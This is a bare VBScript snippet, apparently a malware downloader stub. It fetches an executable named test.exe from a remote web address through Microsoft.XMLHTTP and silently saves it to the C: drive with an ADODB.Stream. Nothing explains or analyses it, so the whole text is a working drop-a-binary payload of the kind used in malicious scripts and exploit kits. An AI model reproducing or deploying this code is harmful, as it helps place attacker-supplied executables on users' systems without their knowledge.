Dim xget 
Set xget = CreateObject("Microsoft.XMLHTTP") 
xget.Open "GET", "http://www.x.org/test.exe", false 
xget.Send 
DataBin = xget.ResponseBody 
Const adTypeBinary=1 
Const adSaveCreateOverWrite=2 
Dim SendBinary 
Set SendBinary = CreateObject("ADODB.Stream") 
SendBinary.Type = adTypeBinary 
SendBinary.Open 
SendBinary.Write DataBin 
SendBinary.SaveToFile "c:\test.exe", adSaveCreateOverWrite 
